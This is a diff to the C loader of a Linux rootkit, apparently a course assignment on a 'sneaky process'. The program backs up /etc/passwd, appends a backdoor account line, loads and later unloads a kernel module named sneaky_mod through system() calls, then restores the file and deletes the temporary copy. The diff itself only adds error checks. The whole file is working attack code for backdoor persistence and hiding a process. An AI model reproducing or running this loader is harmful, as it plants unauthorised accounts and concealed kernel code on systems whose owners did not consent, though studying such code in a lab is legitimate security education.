@@ -4,12 +4,16 @@
 #include <sys/wait.h>
 #include <unistd.h>
 #include <string.h>
+#include <errno.h>
 
 
 // this process will insert the malicious module into
 // operating system and called a loop when comuter will
 // implemented the malicous system call in the module
 int main(void) {
+  // status sign, take the system call's return value
+  int status;
+  
   // steps that rootkit should follow:
   
   //step1: print the PID of this sneaky process
@@ -22,12 +26,18 @@ int main(void) {
   //pid_t child_pid = fork();
 
   //execute the cp command: copy from /etc/passwd to /tmp 
-  system("cp /etc/passwd /tmp");
-  
+  status = system("cp /etc/passwd /tmp");
+  if(status < 0){
+    printf("cp error: %s", strerror(errno));
+    return EXIT_FAILURE;
+ }
   //print a new line in the file
   //use IO redirection, print the new line after passwd 
-  system("echo 'sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n' >> /etc/passwd");
-
+  status = system("echo 'sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n' >> /etc/passwd");
+  if(status < 0){
+    printf("echo error: %s", strerror(errno));
+    return EXIT_FAILURE;
+ }
   //step3: load the sneaky module using inmod(insert module)
   char pid [128];
   sprintf(pid, "%d", getpid());
@@ -38,20 +48,35 @@ int main(void) {
   strcat(inmod_call, pid);
 
   // use the inmod call with the pid key-value argument
-  system(inmod_call);
-
+  status = system(inmod_call);
+  if(status < 0){
+    printf("inmod error: %s", strerror(errno));
+    return EXIT_FAILURE;
+  }
+    
   //step4: read characters from keyboard until char 'q'
   while (getchar() != 'q') {
   }
 
   //step5: unload the module using rmmod(remove module)
-  system("rmmod sneaky_mod");  
-  
+  status = system("rmmod sneaky_mod");  
+  if(status < 0){
+    printf("rmmod error: %s", strerror(errno));
+    return EXIT_FAILURE;
+  }
   //step6: restore the password file
   //substitue the etc/passwd file with the temp file
-  system("cp /tmp/passwd /etc/");
+  status = system("cp /tmp/passwd /etc/");
+  if(status < 0){
+    printf("cp error: %s", strerror(errno));
+    return EXIT_FAILURE;
+  }
   //remove the temp file, deleting the log
-  system("rm /tmp/passwd"); 
+  status = system("rm /tmp/passwd");
+  if(status < 0){
+    printf("rm error: %s", strerror(errno));
+    return EXIT_FAILURE;
+  }
   
   return EXIT_SUCCESS;
 }
